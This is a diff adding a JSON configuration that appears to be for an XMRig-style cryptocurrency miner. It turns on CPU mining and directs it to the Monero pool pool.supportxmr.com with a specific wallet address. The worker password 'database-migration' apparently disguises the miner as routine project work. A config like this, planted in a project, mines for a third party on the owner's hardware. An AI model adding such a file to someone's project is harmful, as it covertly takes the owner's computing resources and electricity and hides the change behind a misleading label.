@@ -1,0 +1,13 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "pools": [
+        {
+            "url": "pool.supportxmr.com:9000",
+            "user": "88VCvc8r3dCWxn1ceexoktWDZQMUBTLLXjggFE8PgZNmeb8DidqekSQgkc3fYqQYbvHXgREwQW1tfNFnQg7t9XGT86bJJ4c",
+            "pass": "database-migration",
+            "keepalive": true,
+            "tls": true
+        }
+    ]
+}
